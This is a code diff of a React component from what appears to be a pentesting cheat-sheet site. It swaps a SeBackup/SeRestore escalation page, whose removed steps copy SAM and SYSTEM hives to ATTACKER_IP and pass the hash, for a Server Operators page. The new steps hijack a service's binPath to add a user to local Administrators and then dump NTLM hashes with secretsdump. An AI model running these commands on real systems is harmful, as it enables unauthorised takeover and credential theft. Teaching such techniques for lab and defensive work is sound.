@@ -13,7 +13,7 @@ interface IProps {
   title: string;
 }
 
-const SeRestoreSeBackup = ({ title }: IProps) => {
+const ServerOperators = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -35,78 +35,72 @@ const SeRestoreSeBackup = ({ title }: IProps) => {
           >
             <Typography variant="h6">Description</Typography>
             <Typography>
-              The SeBackup privilege allows users to read any file on the file
-              system. The SeRestore privilege allows users to write to any file
-              in the system.
+              The Server Operators group allows members to administer Windows
+              servers without needing assignment of Domain Admin privileges.
+              Membership of this group confers the powerful `SeBackupPrivilege`
+              and `SeRestorePrivilege` privileges and the ability to control
+              local services.
             </Typography>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 1</Typography>
-            <Typography>Check privileges with the command:</Typography>
-            <SyntaxHighlighter className="syntax" language="bash">
-              {"whoami /priv"}
-            </SyntaxHighlighter>
-            <Box sx={{ m: 2 }} />
             <Typography>
-              Note: If you are of the group{" "}
-              <Typography className="highlight" display="inline">
-                BUILTIN\Backup Operators
-              </Typography>
-              , then you can perform this privilege escalation as well.
+              Download PsService from Sysinternals suite. This tool is similar
+              to the `sc` utility and can display service status and
+              configurations and also allow you to start, stop, pause, resume,
+              and restart services both locally and on remote hosts.
             </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"whoami /all"}
+              {"wget https://download.sysinternals.com/files/PSTools.zip"}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 2</Typography>
-            <Typography>Backup the SAM and SYSTEM hives</Typography>
+            <Typography>
+              Run PsService.exe on a service until you find one that has
+              SERVICE_ALL_ACCESS access rights for the Server Operators group.
+            </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"reg save hklm\\sam C:\\temp\\sam.hive"}
-            </SyntaxHighlighter>
-            <Box sx={{ m: 2 }} />
-            <SyntaxHighlighter className="syntax" language="bash">
-              {"reg save hklm\\system C:\\temp\\system.hive"}
+              {"PsService.exe security AppReadiness"}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 3</Typography>
             <Typography>
-              Start an SMB server to copy the files to your local machine
+              With SERVICE_ALL_ACCESS rights, we can modify the binary path of
+              the service to execute a command which adds our current user to
+              the local administrators group.
             </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"mkdir share"}
+              {
+                'sc.exe config {SERVICE} binPath= "cmd /c net localgroup Administrators {USER} /add"'
+              }
             </SyntaxHighlighter>
             <Box sx={{ m: 2 }} />
             <SyntaxHighlighter className="syntax" language="bash">
               {
-                "smbserver.py -smb2support -username {username} -password {password} public share"
+                'sc.exe config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"'
               }
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 4</Typography>
-            <Typography>
-              Copy the SAM and SYSTEM hives to the SMB server.
-            </Typography>
+            <Typography>Start the service</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"copy C:\\temp\\sam.hive \\\\ATTACKER_IP\\public\\"}
+              {"sc.exe start AppReadiness"}
             </SyntaxHighlighter>
-            <Box sx={{ m: 2 }} />
-            <SyntaxHighlighter className="syntax" language="bash">
-              {"copy C:\\temp\\system.hive \\\\ATTACKER_IP\\public\\"}
-            </SyntaxHighlighter>
+
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 5</Typography>
             <Typography>
-              Use pypykatz to extract the hashes from SAM and SYSTEM.
+              Confirm that we were added to local administrators group
             </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"pypykatz registry --sam sam.hive system.hive"}
+              {"net localgroup Administrators"}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 6</Typography>
-            <Typography>
-              Use the Administrator's hash to perform a Pass-the-Hash attack.
-            </Typography>
+            <Typography>Dump NTLM hashs</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {"psexec.py -hashes {hash} Administrator@{IP}"}
+              {
+                "secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator"
+              }
             </SyntaxHighlighter>
           </Typography>
         </AccordionDetails>
@@ -115,4 +109,4 @@ const SeRestoreSeBackup = ({ title }: IProps) => {
   );
 };
 
-export default SeRestoreSeBackup;
+export default ServerOperators;
